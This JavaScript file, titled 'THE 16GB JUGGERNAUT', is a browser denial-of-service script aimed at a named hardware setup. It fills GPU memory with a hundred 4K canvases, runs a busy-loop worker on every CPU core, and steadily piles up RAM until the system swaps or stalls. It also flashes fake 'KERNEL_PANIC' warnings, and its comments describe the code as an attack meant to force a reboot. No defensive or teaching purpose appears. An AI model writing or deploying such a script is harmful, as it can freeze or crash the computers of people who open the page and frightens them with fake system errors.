/** * PROTOCOL: THE 16GB JUGGERNAUT
 * Target: i7 / GTX 970 / 16GB RAM
 */

const anchor = [];

// --- 1. THE GPU VRAM SINK ---
// Creating thousands of hidden canvases to eat the GTX 970's memory
function drainVRAM() {
    for(let i=0; i<100; i++) {
        const c = document.createElement('canvas');
        c.width = 4096; // 4K texture
        c.height = 4096;
        const ctx = c.getContext('2d');
        ctx.fillStyle = `rgb(${Math.random()*255},0,0)`;
        ctx.fillRect(0, 0, 4096, 4096);
        // We don't append them to the DOM, but keeping them in memory 
        // forces the browser to hold GPU textures.
        anchor.push(c);
    }
    console.log("%c VRAM_LEAK_INJECTED", "color: magenta; font-weight: bold;");
}
drainVRAM();

// --- 2. THE MULTI-THREADED ATTACK (Web Workers) ---
// We create a "Blob" worker to run on every logical core of that i7
const workerCode = `
    setInterval(() => {
        let x = 0;
        for(let i=0; i<10000000; i++) { x += Math.sqrt(Math.random()); }
        postMessage(x);
    }, 1);
`;
const blob = new Blob([workerCode], {type: 'application/javascript'});
const workerUrl = URL.createObjectURL(blob);

for(let i=0; i<navigator.hardwareConcurrency; i++) {
    const w = new Worker(workerUrl);
    w.onmessage = (e) => {
        // Keep the main thread busy by receiving junk data
        if(Math.random() > 0.99) console.log("CORE_" + i + "_STRESSED");
    };
}

// --- 3. THE 16GB RAM SATURATOR ---
// This fills up the remaining 5GB of your RAM specifically.
setInterval(() => {
    try {
        const buffer = new Uint32Array(2000000); // ~8MB per tick
        for(let i=0; i<buffer.length; i++) buffer[i] = i * Math.random();
        anchor.push(buffer);
        
        if(anchor.length > 1000) {
            console.error("OS_SWAP_FILE_ENGAGED. LIKELY SYSTEM STALL.");
        }
    } catch(e) {
        console.log("%c RAM_CAP_REACHED: Browser is likely about to die.", "background: black; color: white;");
    }
}, 50);

// --- 4. THE VISUAL "BEAST" ---
// Forcing the browser to calculate complex math for every pixel
setInterval(() => {
    const loop = document.getElementById('feedback-loop');
    const hue = Math.floor(Math.random() * 360);
    loop.style.filter = `hue-rotate(${hue}deg) blur(${Math.random() * 5}px) invert(1)`;
    
    // Fake crash warnings
    if(Math.random() > 0.98) {
        const warn = document.createElement('div');
        warn.style.cssText = "position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); font-size:100px; color:white; z-index:10000; background:red;";
        warn.innerText = "KERNEL_PANIC";
        document.body.appendChild(warn);
        setTimeout(() => warn.remove(), 200);
    }
}, 30);

console.log("%c 💀 PREPARE FOR REBOOT 💀 ", "font-size: 60px; color: red; text-shadow: 10px 10px #000;");